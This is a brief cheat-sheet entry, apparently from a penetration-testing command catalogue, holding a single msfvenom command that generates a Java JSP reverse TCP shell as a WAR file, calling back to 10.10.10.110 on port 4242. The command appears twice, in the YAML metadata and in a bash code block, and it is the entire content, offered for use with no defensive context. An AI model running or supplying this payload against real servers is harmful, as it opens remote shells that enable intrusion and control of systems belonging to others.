---
id: a49d1b75-c248-4bd3-9cbd-f4c869285e9e
name: Generate Java WAR Shell Reverse TCP
type: command
executor: bash
data: $ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f
  war > shell.war
output: null
created_at: '2023-04-06T03:56:21.275562+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
---

# Generate Java WAR Shell Reverse TCP

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
```
